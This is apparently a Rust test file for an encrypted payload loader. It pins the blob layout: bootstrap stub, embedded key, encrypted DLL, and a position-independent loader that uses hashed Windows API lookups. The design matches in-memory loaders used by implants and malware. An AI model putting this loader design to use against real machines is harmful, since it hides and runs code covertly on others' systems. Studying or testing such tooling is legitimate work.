//! Host-side payload-format tests for `wrap_payload` (spec §5.4).
//!
//! `wrap_payload` emits the definitive blob layout
//!
//! ```text
//! [LAYER1 + bridge][key 32B][NYX2 magic (4B)][encrypted_len u32 LE (4B)]
//! [nonce (12B)][ciphertext (N bytes)][Poly1305 tag (16B)][LAYER2 code]
//! ```
//!
//! These tests pin the byte layout: stub prefix, key slot, header fields,
//! ciphertext placement, the Layer-2 blob appended after the tag, and the
//! Layer-1 `jmp rel32` displacement patched to land on the Layer-2 entry.

use nyx_loader::{
    on_target, wrap_payload, LoaderConfig, CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, KEY_LEN,
    KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP, LAYER2_CODE, LAYER2_ENTRY_OFFSET, LAYER2_JMP_OFFSET,
    NONCE_OFFSET, NYX2_MAGIC, TAG_LEN,
};

/// Build a small but non-trivial fake DLL body.
fn fake_dll() -> Vec<u8> {
    let mut dll = Vec::new();
    dll.extend_from_slice(b"MZ");
    dll.extend_from_slice(&[0u8; 62]);
    dll.extend_from_slice(b"PE\0\0");
    dll.extend_from_slice(&[0xAAu8; 200]);
    dll
}

/// `wrap_payload` emits the full definitive blob and every field sits at its
/// documented offset:
///
/// ```text
/// 0                 LAYER1_BOOTSTRAP.len()    +KEY_LEN      +20       +N+16
/// [LAYER1 + bridge] [key 32B]                 [magic][len][nonce][ct||tag][LAYER2]
/// ```
#[test]
fn wrap_payload_emits_definitive_layout() {
    let key = [0x11u8; 32];
    let nonce = [0x22u8; 12];
    let config = LoaderConfig::new(key, nonce);
    let dll = fake_dll();
    let payload = wrap_payload(&dll, &config).expect("wrap_payload must succeed");

    let stub_len = LAYER1_BOOTSTRAP.len() + KEY_LEN;
    let header_off = stub_len; // NYX2 magic
    let enc_len_off = header_off + ENCRYPTED_LEN_OFFSET;
    let nonce_off = header_off + NONCE_OFFSET;
    let ct_off = header_off + CIPHERTEXT_OFFSET; // magic + enc_len + nonce = 20
    let ct_tag_len = dll.len() + TAG_LEN;
    let layer2_off = ct_off + ct_tag_len;

    // Stub prefix: LAYER1 verbatim EXCEPT the jmp-rel32 displacement slot
    // (the emitter patches it in place to land on Layer-2; the const carries
    // the placeholder zeros). Compare around the slot.
    assert_eq!(
        &payload[..LAYER2_JMP_OFFSET],
        &LAYER1_BOOTSTRAP[..LAYER2_JMP_OFFSET]
    );
    assert_eq!(
        &payload[LAYER2_JMP_OFFSET + 5..LAYER1_BOOTSTRAP.len()],
        &LAYER1_BOOTSTRAP[LAYER2_JMP_OFFSET + 5..]
    );
    assert_eq!(
        &payload[KEY_PATCH_OFFSET..KEY_PATCH_OFFSET + KEY_LEN],
        &key[..]
    );

    // NYX2 header: magic, encrypted_len (excl. tag), nonce.
    assert_eq!(
        u32::from_le_bytes(payload[header_off..header_off + 4].try_into().unwrap()),
        NYX2_MAGIC
    );
    let enc_len = u32::from_le_bytes(payload[enc_len_off..enc_len_off + 4].try_into().unwrap());
    assert_eq!(
        enc_len,
        dll.len() as u32,
        "encrypted_len must be the plaintext length, excluding the 16-byte tag"
    );
    assert_eq!(&payload[nonce_off..nonce_off + 12], &nonce[..]);

    // Ciphertext occupies [ct_off, layer2_off) and LAYER2 follows it.
    assert_eq!(ct_off - header_off, CIPHERTEXT_OFFSET);
    assert_eq!(layer2_off - ct_off, ct_tag_len);
    assert_eq!(
        &payload[layer2_off..layer2_off + LAYER2_CODE.len()],
        LAYER2_CODE,
        "LAYER2 (pic-loader) must be appended right after ct||tag"
    );
    assert_eq!(payload.len(), layer2_off + LAYER2_CODE.len());

    // The Layer-1 jmp rel32 is patched to land on the Layer-2 entry.
    let disp = i32::from_le_bytes(
        payload[LAYER2_JMP_OFFSET + 1..LAYER2_JMP_OFFSET + 5]
            .try_into()
            .unwrap(),
    );
    let target = (LAYER2_JMP_OFFSET + 5) as i64 + i64::from(disp);
    assert_eq!(
        target as usize,
        layer2_off + LAYER2_ENTRY_OFFSET,
        "jmp rel32 must transfer control to the Layer-2 entry"
    );

    // The on-target scan (from offset 5, bound 256) must land on the real
    // header, not on any earlier window of the stub or key.
    let found = on_target::find_magic_offset(&payload, 5, on_target::MAGIC_SCAN_BOUND)
        .expect("scan must locate the NYX2 header");
    assert_eq!(found, header_off);
}

/// The header field offsets are absolute constants documented in `stub.rs`
/// (`ENCRYPTED_LEN_OFFSET = 4`, `NONCE_OFFSET = 8`, `CIPHERTEXT_OFFSET = 20`).
/// Pin them so a change is caught here rather than as an on-target parse
/// failure.
#[test]
fn header_offsets_match_documented_layout() {
    assert_eq!(ENCRYPTED_LEN_OFFSET, 4);
    assert_eq!(NONCE_OFFSET, 8);
    assert_eq!(CIPHERTEXT_OFFSET, 20);
    assert_eq!(TAG_LEN, 16);
    // magic + enc_len + nonce = 4 + 4 + 12 = 20 = CIPHERTEXT_OFFSET.
    assert_eq!(4 + 4 + 12, CIPHERTEXT_OFFSET);
}

/// `on_target` module must publicly expose the constants the layout contract
/// relies on (Layer-1/Layer-2 boundaries + the Layer-2 design constants the
/// pic-loader honours). This is a structural assertion: if a constant is
/// renamed/removed the test stops compiling, surfacing the API change at the
/// right call site.
#[test]
fn on_target_constants_are_accessible() {
    // Touch each constant so a rename is a compile error here, not a silent
    // behaviour change on-target.
    let _ = on_target::KEY_PATCH_OFFSET;
    let _ = on_target::KEY_LEN;
    let _ = on_target::MAGIC_SCAN_BOUND;
    let _ = on_target::HASH_KERNEL32_DLL;
    let _ = on_target::HASH_VIRTUAL_ALLOC;
    let _ = on_target::HASH_LOAD_LIBRARY_A;
    let _ = on_target::HASH_GET_PROC_ADDRESS;
    let _ = on_target::HASH_VIRTUAL_PROTECT;
    let _ = on_target::MEM_COMMIT_RESERVE;
    let _ = on_target::PAGE_READONLY;
    let _ = on_target::PAGE_READWRITE;
    let _ = on_target::PAGE_EXECUTE_READ;
    let _ = on_target::PAGE_EXECUTE_READWRITE;
    let _ = on_target::IMAGE_SCN_MEM_EXECUTE;
    let _ = on_target::IMAGE_SCN_MEM_WRITE;
    let _ = on_target::section_protect_from_characteristics(0);
    let _ = on_target::DLL_PROCESS_ATTACH;
    let _ = on_target::LAYER2_JMP_OFFSET;
    let _ = on_target::LAYER2_ENTRY_OFFSET;
    let _ = on_target::LAYER2_CODE;
    let _ = on_target::LAYER1_BOOTSTRAP;
}
